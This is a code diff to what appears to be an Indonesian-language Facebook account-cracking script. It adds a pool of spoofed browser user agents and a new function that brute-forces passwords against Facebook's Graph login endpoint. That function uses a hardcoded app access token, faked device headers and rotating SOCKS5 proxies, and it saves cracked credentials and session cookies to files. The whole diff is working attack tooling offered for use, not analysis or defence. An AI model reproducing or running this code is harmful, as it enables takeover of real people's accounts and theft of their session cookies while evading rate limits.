@@ -726,6 +726,29 @@ for t in range(10000):
 	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
 
+faugen = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:100.0) Gecko/20100101 Firefox/100.0",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:100.0) Gecko/20100101 Firefox/100.0",
+    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
+    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:100.0) Gecko/20100101 Firefox/100.0",
+    "Mozilla/5.0 (Windows NT 10.0; rv:100.0) Gecko/20100101 Firefox/100.0",
+    "Mozilla/5.0 (Windows NT 5.1; rv:100.0) Gecko/20100101 Firefox/100.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; IA32; rv:100.0) Gecko/20100101 Firefox/100.0",
+    "Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
+    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
+    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
+    "Mozilla/5.0 (Windows NT 10.0; rv:50.0) Gecko/20100101 Firefox/50.0",
+    "Mozilla/5.0 (Windows NT 5.1; rv:50.0) Gecko/20100101 Firefox/50.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; IA32; rv:50.0) Gecko/20100101 Firefox/50.0",
+    "Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
+] * 5  # Dikali 5 untuk mencapai total 100
+
 # ------------[ INDICATION ]---------------#
 M2 = "[#FF0000]"  # MERAH
 H2 = "[#00FF00]"  # HIJAU
@@ -862,7 +885,7 @@ def banner():
 def login123():
     clear()
     banner()
-    Console().print(Panel(f"""{P2}[{color_text}01{P2}].Login Menggunakan Cookie\n{P2}[{color_text}02{P2}].Login Menggunakan email dan password\n[{color_text}03{P2}].{M2}Keluar""",width=60,style=f"{color_panel}",title="[bold green]Login"))
+    Console().print(Panel(f"""{P2}[{color_text}01{P2}].Login Menggunakan Cookie\n{P2}[{color_text}02{P2}].Login Menggunakan email dan password [{K2}Dump maintenance{P2}]\n[{color_text}03{P2}].{M2}Keluar""",width=60,style=f"{color_panel}",title="[bold green]Login"))
     fansph = console.input(f" {H2}• {P2}pilih menu : ")
     if fansph in ["1", "01"]:
         logincoki()
@@ -1512,7 +1535,7 @@ def metslow():
                 else:
                     pass
                 if "fankygraph" in method:
-                    pool.submit(fankygraphv1,idf,pwv,"graph.facebook.com")
+                    pool.submit(fanapi,idf,pwv)
                 elif "fankywww" in method:
                     pool.submit(fankywww,idf,pwv)
                 elif "fankygraphv2" in method:
@@ -1583,7 +1606,7 @@ def metcepat():
                         pwv.append(xpwd)
                 else:pass
                 if "fankygraph" in method:
-                    pool.submit(fankygraphv1,idf,pwv,"graph.facebook.com")
+                    pool.submit(fanapi,idf,pwv)
                 elif "fankywww" in method:
                     pool.submit(fankywww,idf,pwv)
                 elif "fankygraphv2" in method:
@@ -1606,7 +1629,69 @@ def metcepat():
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
     print("")
 
-	
+#-------------------[ CRACK-MAIN ]------------#
+def fanapi(idf,pwv):
+	global loop,ok,cp
+	prog.update(des, description=f" {H2}•{H2} FANKY GRAPH {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.advance(des)
+	ua = random.choice(faugen)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			if 'ya' in ualuh:ua = ualu[0]
+			nip = random.choice(prox)
+			proxs = {'http': 'socks5://' + nip}
+			params = {
+					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
+					"sdk_version": {random.randint(1,26)}, 
+					"email": idf,
+					"locale": "en_US",
+					"password": pw,
+					"sdk": "android",
+					"generate_session_cookies": "1",
+					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
+				}
+			headers = {
+					"Host": "graph.facebook.com",
+					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
+					"x-fb-sim-hni": str(random.randint(20000, 40000)),
+					"x-fb-net-hni": str(random.randint(20000, 40000)),
+					"x-fb-connection-quality": "EXCELLENT",
+					"user-agent": ua,
+					"content-type": "application/x-www-form-urlencoded",
+					"x-fb-http-engine": "Liger"
+				}
+			xnxx = ses.post("https://graph.facebook.com/auth/login", params = params, headers = headers, allow_redirects=False,proxies=proxs)
+			anjg = json.loads(xnxx.text)
+			if "session_key" in xnxx.text:
+				ok += 1
+				kuki = ";".join(i["name"] + "=" + i["value"] for i in post.json()["session_cookies"]);user = re.findall("c_user=(.*?)", kuki)[0]
+				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
+				prints(tree)
+				open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
+				break
+			elif "checkpoint" in xnxx.text:
+				cp+=1
+				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
+				prints(tree)
+				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+				break				
+			elif "Calls to this api have exceeded the rate limit. (613)" in xnxx.text:
+			    prog.update(des,description=f"{H2}•{M2} SPAM {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+			    prog.advance(des)
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+
 #-------------------[ CRACK-MAIN ]------------#
 def fankygraphv1(idf, pwv, url):
     global loop, ok, cp
